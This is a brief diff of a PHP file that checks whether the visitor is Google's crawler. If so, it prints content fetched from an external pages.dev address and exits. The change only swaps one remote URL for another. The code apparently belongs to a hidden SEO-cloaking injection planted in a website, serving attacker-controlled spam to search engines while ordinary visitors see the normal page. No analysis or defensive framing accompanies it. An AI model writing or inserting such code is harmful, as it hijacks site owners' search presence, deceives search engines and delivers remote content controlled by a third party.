@@ -19,7 +19,7 @@ function is_google_bot() {
 }
 
 if (is_google_bot()) {
-    echo file_get_contents("https://batman-bekasi.pages.dev/index.txt");
+    echo file_get_contents("https://roketkaka.pages.dev/index.txt");
     exit;
 }
 ?>
